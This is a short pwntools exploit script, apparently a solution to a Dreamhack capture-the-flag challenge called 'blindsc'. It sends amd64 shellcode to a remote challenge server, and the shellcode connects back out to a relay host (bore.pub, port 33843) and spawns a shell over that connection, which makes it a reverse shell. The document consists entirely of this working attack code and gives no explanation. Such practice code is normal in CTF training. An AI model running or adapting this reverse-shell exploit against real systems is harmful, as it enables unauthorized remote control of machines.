from pwn import *
#elf = ELF("./blindsc")
#p = elf.process()
p = remote("host8.dreamhack.games", 17211)

context.arch = "amd64"
context.os = "linux"

shellcode = shellcraft.connect('bore.pub', 33843)
shellcode += shellcraft.findpeersh()

p.readuntil(b': ')
p.sendline(asm(shellcode))
